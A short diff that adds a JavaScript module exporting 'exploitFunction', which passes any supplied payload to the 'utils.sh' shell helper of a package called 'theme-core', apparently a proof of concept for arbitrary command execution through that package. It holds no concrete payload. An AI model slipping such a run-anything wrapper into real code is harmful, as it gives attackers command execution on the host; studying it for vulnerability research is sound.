@@ -1,0 +1,8 @@
+function exploitFunction(payload) {
+  const a = require("theme-core");
+  a.utils.sh(payload, true, function () {
+    // No need to handle the callback here since we are only interested in the payload execution
+  });
+}
+
+module.exports = { exploitFunction };
